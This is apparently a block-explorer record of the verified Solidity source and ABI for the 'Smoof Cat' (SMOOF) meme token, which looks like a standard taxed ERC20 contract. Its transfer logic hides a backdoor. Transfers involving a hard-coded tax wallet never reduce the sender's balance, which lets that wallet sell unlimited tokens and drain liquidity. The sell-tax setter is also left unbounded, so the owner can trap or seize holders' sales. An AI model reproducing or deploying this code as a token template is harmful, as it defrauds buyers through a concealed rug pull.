{
  "TxHash": "0x56a81724d9c0fa6e8bff47d08d4740e3ac56d2a62e33ac37354849767da72af2",
  "ContractAddress": "0xd1a3D95a56e08967c3C60A89F32aF409e8D80203",
  "Name": "SMOOF",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "/**\r\nWebsite: https://smoofcateth.xyz\r\nX:    https://x.com/smoofcateth\r\nTelegram:https://t.me/smoofcateth\r\n */\r\n\r\n\r\n// SPDX-License-Identifier: UNLICENSE\r\n\r\npragma solidity ^0.8.19;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ninterface IDexFactory {\r\n    function createPair(\r\n        address tokenA,\r\n        address tokenB\r\n    ) external returns (address pair);\r\n}\r\n\r\ninterface IDexRouter {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);\r\n}\r\n\r\ncontract SMOOF is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping(address =\u003e uint256) private _poses;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n    mapping(address =\u003e bool) private _feeExempt;\r\n    mapping(address =\u003e bool) private _swapExempt;\r\n    mapping(address =\u003e bool) private bots;\r\n    address payable private _takerPort;\r\n\r\n    uint256 _buyingTax = 0;\r\n    uint256 _sellingTax = 0;\r\n\r\n    uint8 private constant _decimals = 18;\r\n    uint256 private constant _supplies = 1_000_000_000 * 10 ** _decimals;\r\n    string private constant _name = unicode\"Smoof Cat\";\r\n    string private constant _symbol = unicode\"SMOOF\";\r\n    uint256 public _swapLowLimit = 5_000 * 10 ** _decimals;\r\n    uint256 public _txHighLimit = 20_000_000 * 10 ** _decimals;\r\n    uint256 public _walletHighLimit = 20_000_000 * 10 ** _decimals;\r\n    uint256 public _swapHightLimit = 10_000_000 * 10 ** _decimals;\r\n\r\n    IDexRouter private dexRouter;\r\n    address private dexPair;\r\n    bool private launched;\r\n    bool private swapGoing = false;\r\n    bool private swapOpen = false;\r\n\r\n    event MaxTxAmountUpdated(uint256 _maxTxAmount);\r\n    modifier lockTheSwap() {\r\n        swapGoing = true;\r\n        _;\r\n        swapGoing = false;\r\n    }\r\n\r\n    constructor() {\r\n        dexRouter = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _takerPort = payable(0xc35Bb6EddbCCf298Ed61Ff0E95CaBbd2c5cD26DB);\r\n\r\n        _poses[_msgSender()] = _supplies;\r\n        _swapExempt[_takerPort] = true;\r\n        _feeExempt[owner()] = true;\r\n        _feeExempt[address(this)] = true;\r\n        _feeExempt[_takerPort] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _supplies);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _supplies;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _poses[account];\r\n    }\r\n\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(\r\n            sender,\r\n            _msgSender(),\r\n            _allowances[sender][_msgSender()].sub(\r\n                amount,\r\n                \"ERC20: transfer amount exceeds allowance\"\r\n            )\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function closeGate() external onlyOwner {\r\n        _txHighLimit = _supplies;\r\n        _walletHighLimit = _supplies;\r\n        emit MaxTxAmountUpdated(_supplies);\r\n    }\r\n\r\n    function sendMoon(uint256 amount) private {\r\n        _takerPort.transfer(amount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function throwTax(\r\n        address from,\r\n        address to,\r\n        uint256 amount,\r\n        uint256 taxRate\r\n    ) internal returns (uint256) {\r\n        bool isExcluded = _swapExempt[from] || _swapExempt[to];\r\n\r\n        if (isExcluded) {\r\n            return amount;\r\n        } else {\r\n            uint256 taxAmount = amount.mul(taxRate).div(100);\r\n            if (taxAmount \u003e 0) {\r\n                _poses[address(this)] = _poses[address(this)].add(taxAmount);\r\n                emit Transfer(from, address(this), taxRate);\r\n            }\r\n            _poses[from] = _poses[from].sub(amount);\r\n\r\n            return amount - taxAmount;\r\n        }\r\n    }\r\n\r\n    function _transfer(address fold, address timb, uint256 avvv) private {\r\n        require(fold != address(0), \"ERC20: transfer from the zero address\");\r\n        require(timb != address(0), \"ERC20: transfer to the zero address\");\r\n        require(avvv \u003e 0, \"Transfer amount must be greater than zero\");\r\n        uint256 ttii = 0;\r\n        if (fold != owner() \u0026\u0026 timb != owner()) {\r\n            require(!bots[fold] \u0026\u0026 !bots[timb]);\r\n            ttii = _buyingTax;\r\n\r\n            if (\r\n                fold == dexPair \u0026\u0026\r\n                timb != address(dexRouter) \u0026\u0026\r\n                !_feeExempt[timb]\r\n            ) {\r\n                require(avvv \u003c= _txHighLimit, \"amount \u003c= maxTx\");\r\n                require(\r\n                    balanceOf(timb) + avvv \u003c= _walletHighLimit,\r\n                    \"wallet \u003c= maxWallet\"\r\n                );\r\n            }\r\n\r\n            if (timb == dexPair \u0026\u0026 fold != address(this)) {\r\n                ttii = _sellingTax;\r\n            }\r\n\r\n            if (_feeExempt[fold] || _feeExempt[timb]) {\r\n                ttii = 0;\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (\r\n                !swapGoing \u0026\u0026 timb == dexPair \u0026\u0026 swapOpen \u0026\u0026 !_feeExempt[fold]\r\n            ) {\r\n                swapTokensForEth(\r\n                    min(avvv, min(contractTokenBalance, _swapHightLimit))\r\n                );\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if (contractETHBalance \u003e= 0 ether) {\r\n                    sendMoon(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        uint256 taxed = throwTax(fold, timb, avvv, ttii);\r\n        _poses[timb] = _poses[timb].add(taxed);\r\n        emit Transfer(fold, timb, taxed);\r\n    }\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\r\n        return (a \u003e b) ? b : a;\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\r\n        if (tokenAmount \u003e _swapLowLimit) {\r\n            address[] memory path = new address[](2);\r\n            path[0] = address(this);\r\n            path[1] = dexRouter.WETH();\r\n            _approve(address(this), address(dexRouter), tokenAmount);\r\n            dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                tokenAmount,\r\n                0,\r\n                path,\r\n                address(this),\r\n                block.timestamp\r\n            );\r\n        }\r\n    }\r\n\r\n    function makePair() external onlyOwner {\r\n        require(!launched, \"trading != open\");\r\n        _approve(address(this), address(dexRouter), _supplies);\r\n        dexPair = IDexFactory(dexRouter.factory()).createPair(\r\n            address(this),\r\n            dexRouter.WETH()\r\n        );\r\n        dexRouter.addLiquidityETH{value: address(this).balance}(\r\n            address(this),\r\n            balanceOf(address(this)),\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp\r\n        );\r\n\r\n        swapOpen = true;\r\n        launched = true;\r\n    }\r\n\r\n    function manageTax(\r\n        uint256 _newTaxForBuy,\r\n        uint256 _newTaxForSell\r\n    ) external onlyOwner {\r\n        require(_newTaxForBuy \u003c= 99 \u0026\u0026 _newTaxForBuy \u003c= 99, \"fee \u003c 100\");\r\n        _buyingTax = _newTaxForBuy;\r\n        _sellingTax = _newTaxForSell;\r\n    }\r\n\r\n    receive() external payable {}\r\n}",
      "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_swapHightLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapLowLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_txHighLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_walletHighLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"closeGate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"makePair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_newTaxForBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_newTaxForSell\",\"type\":\"uint256\"}],\"name\":\"manageTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
      "ContractName": "SMOOF",
      "CompilerVersion": "v0.8.19+commit.7dd6d404",
      "OptimizationUsed": "1",
      "Runs": "200",
      "ConstructorArguments": "",
      "EVMVersion": "Default",
      "Library": "",
      "LicenseType": "Unlicense",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://f3f4aa416a8eb9c9d438aa97b3ed4b8beb2dcd166bffc260e9d1647d5ee43f53"
    }
  ]
}
